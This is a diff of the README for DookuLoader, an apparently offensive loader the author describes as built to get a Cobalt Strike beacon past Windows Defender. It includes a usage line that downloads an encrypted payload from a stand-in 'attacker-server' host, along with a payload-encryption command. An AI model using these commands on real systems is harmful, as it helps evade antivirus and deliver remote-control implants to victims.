@@ -19,19 +19,26 @@
 </ul>
 
 <h3>Installation</h3>
-```bash
+
+```bash 
 git clone https://github.com/rottaj/DookuLoader.git
 cd DookuLoader
 make;
 ```
 
-<h3>Run</h3>
+<h3>Run Payload</h3>
+
 ```bash
 .\dooku.exe -url "http://attacker-server/rc4-encrypted-payload.bin" 
 ```
 
+<h3> Encrypt Payload </h3>
+
+```bash
+.\dooku.exe -encrypt "raw-payload.bin" 
+```
 <h3>Contributing</h3>
-I am not a 1337 C programmer by any means. This is something I hacked together to get a cobalt strike beacon past Windows Defender. If you see anything gross or want to improve this tool, create a pull request or message me at jack@rotta.rocks.
+I am not a 1337 C programmer by any means. This is something I hacked together to get a Cobalt Strike beacon past Windows Defender. If you see anything gross or want to improve this tool, create a pull request or message me at jack@rotta.rocks.
 
 <h3>License</h3>
 This project is licensed under the MIT License - see the LICENSE file for details.
@@ -40,14 +47,11 @@ This project is licensed under the MIT License - see the LICENSE file for detail
 Use this software responsibly and only in environments where you have legal permission.<br>
 The author of this tool is not responsible for any misuse or damages caused.
 
-
-
 <br><br>
 
 
 <img src="assets/defender_bypass.png">
-<br><br><br>
-<img src="assets/cs.png">
 <br><br>
+
 
 <b>Note:</b> The use of this tool for malicious purposes is illegal and unethical. Always ensure that you have explicit permission to use this tool in any environment.
